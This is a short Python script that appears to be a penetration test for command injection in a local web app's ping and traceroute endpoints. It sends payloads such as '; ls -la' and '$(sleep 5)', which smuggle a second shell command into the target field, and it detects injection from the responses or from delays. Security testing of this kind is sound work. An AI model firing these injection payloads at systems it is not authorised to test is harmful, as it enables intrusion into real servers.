
import requests
import json
import time

# URL of the application to be tested
BASE_URL = "http://127.0.0.1:5004"
PING_URL = f"{BASE_URL}/run_ping"
TRACEROUTE_URL = f"{BASE_URL}/run_traceroute"

# Payloads for command injection
# I will use Gemini to generate more sophisticated payloads later.
payloads = [
    "; ls -la",
    "&& ls -la",
    "| ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; sleep 5",
    "&& sleep 5",
    "| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
]

def run_test(url, payload):
    """
    Sends a payload to a URL and analyzes the response.
    """
    headers = {"Content-Type": "application/json"}
    data = {"target": f"127.0.0.1{payload}"}
    
    print(f"[*] Testing URL: {url}")
    print(f"[*] Payload: {data['target']}")
    
    start_time = time.time()
    try:
        response = requests.post(url, headers=headers, data=json.dumps(data), timeout=10)
        end_time = time.time()
        
        response_time = end_time - start_time
        
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response time: {response_time:.2f} seconds")
        
        if response_time > 5:
            print("[!!!] Potential time-based command injection detected!")
            
        response_json = response.json()
        print(f"[+] Response body: {json.dumps(response_json, indent=2)}")
        
        # Check for output of injected commands
        if "total" in response_json.get("result", "") and "drwx" in response_json.get("result", ""):
            print("[!!!] Potential command injection detected! 'ls -la' output found.")
            
    except requests.exceptions.Timeout:
        end_time = time.time()
        response_time = end_time - start_time
        print(f"[+] Response time: {response_time:.2f} seconds")
        print("[!!!] Potential time-based command injection detected! (Request timed out after 5s)")
    except Exception as e:
        print(f"[-] An error occurred: {e}")
        
    print("-" * 40)

if __name__ == "__main__":
    print("--- Starting penetration test for command injection ---")
    
    for payload in payloads:
        run_test(PING_URL, payload)
        run_test(TRACEROUTE_URL, payload)
        
    print("--- Penetration test finished ---")
